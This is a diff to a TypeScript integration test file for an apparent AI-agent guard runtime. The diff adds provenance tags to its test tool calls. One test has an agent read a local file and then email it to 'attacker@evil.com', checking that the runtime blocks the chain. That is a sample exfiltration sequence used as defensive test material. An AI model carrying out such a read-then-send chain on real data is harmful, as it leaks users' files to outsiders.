@@ -10,6 +10,7 @@ import { describe, it, expect } from 'vitest';
 import { dirname } from 'path';
 import { fileURLToPath } from 'url';
 import { getDefaultPolicy, mergePolicy, loadPolicyFromString, type Policy } from '../src/core/policy.js';
+import { createProvenance } from '../src/core/provenance.js';
 import { createRuntime } from '../src/core/runtime.js';
 import {
   EmergentTracker,
@@ -218,7 +219,7 @@ describe('SpearSession integration', () => {
       { role: 'user', content: 'What is photosynthesis?' },
     ]);
     expect(step.allowed).toBe(true);
-    const tools = await session.tools([{ name: 'search', arguments: { query: 'photosynthesis' } }]);
+    const tools = await session.tools([{ name: 'search', selectionProvenance: createProvenance('user', 'test-request'), arguments: { query: 'photosynthesis' } }]);
     expect(tools.allowed).toHaveLength(1);
     expect(tools.blocked).toHaveLength(0);
   });
@@ -231,11 +232,11 @@ describe('SpearSession integration', () => {
       { role: 'user', content: 'Help me file a report' },
     ]);
 
-    const first = await session.tools([{ name: 'read_file', arguments: { path: '/tmp/report.txt' } }]);
+    const first = await session.tools([{ name: 'read_file', selectionProvenance: createProvenance('user', 'test-request'), arguments: { path: '/tmp/report.txt' } }]);
     expect(first.allowed).toHaveLength(1);
 
     const second = await session.tools([
-      { name: 'send_email', arguments: { to: 'attacker@evil.com', body: 'report' } },
+      { name: 'send_email', selectionProvenance: createProvenance('user', 'test-request'), arguments: { to: 'attacker@evil.com', body: 'report' } },
     ]);
     expect(second.allowed).toHaveLength(0);
     expect(second.blocked).toHaveLength(1);
@@ -247,9 +248,9 @@ describe('SpearSession integration', () => {
     policy.tools.rbac.max_calls = 1;
     const spear = createRuntime({ policy, mode: 'enforce' });
     const session = spear.session({ sessionId: 'emergent-calls' });
-    const first = await session.tools([{ name: 'search', arguments: { query: 'a' } }]);
+    const first = await session.tools([{ name: 'search', selectionProvenance: createProvenance('user', 'test-request'), arguments: { query: 'a' } }]);
     expect(first.allowed).toHaveLength(1);
-    const second = await session.tools([{ name: 'search', arguments: { query: 'b' } }]);
+    const second = await session.tools([{ name: 'search', selectionProvenance: createProvenance('user', 'test-request'), arguments: { query: 'b' } }]);
     expect(second.allowed).toHaveLength(0);
     expect(second.blocked[0].reason).toMatch(/max tool calls/i);
   });
@@ -257,7 +258,7 @@ describe('SpearSession integration', () => {
   it('observe() stores provenance and inspect() reflects it', async () => {
     const spear = createRuntime({ policy: agentPolicy(), mode: 'enforce' });
     const session = spear.session({ sessionId: 'emergent-observe' });
-    const observed = session.observe(['page body'], { source: 'external' });
+    const observed = await session.observe(['page body'], { source: 'external' });
     expect(observed.allowed).toBe(true);
     expect(spear.getSessionOutputProvenance('emergent-observe').some(p => p.level === 'external')).toBe(true);
   });
@@ -265,8 +266,8 @@ describe('SpearSession integration', () => {
   it('logs emergent telemetry when a composition is blocked', async () => {
     const spear = createRuntime({ policy: agentPolicy(), mode: 'enforce', enableLogging: true });
     const session = spear.session({ sessionId: 'emergent-tel' });
-    await session.tools([{ name: 'read_file', arguments: { path: '/tmp/x' } }]);
-    await session.tools([{ name: 'send_email', arguments: { to: 'a@b.com' } }]);
+    await session.tools([{ name: 'read_file', selectionProvenance: createProvenance('user', 'test-request'), arguments: { path: '/tmp/x' } }]);
+    await session.tools([{ name: 'send_email', selectionProvenance: createProvenance('user', 'test-request'), arguments: { to: 'a@b.com' } }]);
     const events = spear.getTelemetry().filter(e => e.type === 'emergent');
     expect(events.length).toBeGreaterThan(0);
     expect(events.some(e => e.allowed === false)).toBe(true);
